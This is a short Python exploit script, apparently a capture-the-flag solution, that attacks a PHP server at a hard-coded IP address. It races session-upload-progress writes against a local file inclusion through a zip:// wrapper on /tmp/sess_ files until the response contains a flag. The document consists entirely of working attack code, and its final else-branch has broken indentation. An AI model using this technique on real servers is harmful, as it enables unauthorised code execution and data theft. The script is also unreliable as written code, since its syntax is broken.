import requests
import threading

host = 'http://111.186.59.2:50082'
PHPSESSID = 'qiyou'
fileName = "zip:///tmp/sess_" + PHPSESSID + "%231"


def creatSession():
    while True:
        files = {
            "upload": ("tmp.jpg", open("./1.png", "rb"))
        }
        data = {"PHP_SESSION_UPLOAD_PROGRESS": open("./1.zip", "rb").read()}
        headers = {'Cookie': 'PHPSESSID=' + PHPSESSID}
        r = requests.post(host, files=files, headers=headers, data=data)


if __name__ == '__main__':
    url = "{}/index.php?yxxx={}".format(host, fileName)
    headers = {'Cookie': 'PHPSESSID=' + PHPSESSID}

    t = threading.Thread(target=creatSession, args=())
    t.setDaemon(True)
    t.start()

    while True:
        res = requests.get(url, headers=headers)
        if b"flag" in res.content:
            print(res.content)
            break
        else:
        print("[-] retry.")
